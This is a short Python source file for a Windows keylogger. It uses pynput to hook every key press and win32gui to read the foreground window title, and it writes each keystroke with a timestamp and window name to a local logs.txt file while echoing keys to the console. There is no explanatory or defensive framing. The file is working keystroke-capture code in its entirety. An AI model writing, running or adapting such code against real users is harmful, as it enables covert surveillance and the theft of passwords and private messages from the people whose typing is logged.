import datetime
import win32gui

from pynput.keyboard import Key, Listener
from datetime import datetime

name_last_active_window = ""


def on_release(key):
    if key == Key.esc:
        return False


def on_press(key):
    print("{0} pressed".format(key))
    f = open("logs.txt", "a", encoding='utf-8')
    logging = Monitoring()
    global name_last_active_window
    active_window = str(logging.get_active_window())
    if name_last_active_window != active_window:
        f.write("\n")
        f.write(f"Active window: {active_window} {logging.now_time()}\n")
    name_last_active_window = active_window
    f.write(f"{logging.now_time()} {logging.get_key(key)}\n")
    f.close()


class Monitoring:
    def now_time(self):
        time = datetime.now().time().replace(microsecond=0)
        return str(time)

    def get_active_window(self):
        window = win32gui.GetForegroundWindow()
        active_window_name = win32gui.GetWindowText(window)
        return active_window_name

    def get_key(self, key):
        self.key = str(key).replace("'", "")
        return self.key


# def write_file(key):

def main():
    f = open("logs.txt", "w", encoding='utf-8')
    now_data = datetime.now().date()
    f.write(str(now_data))


if __name__ == "__main__":
    main()


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
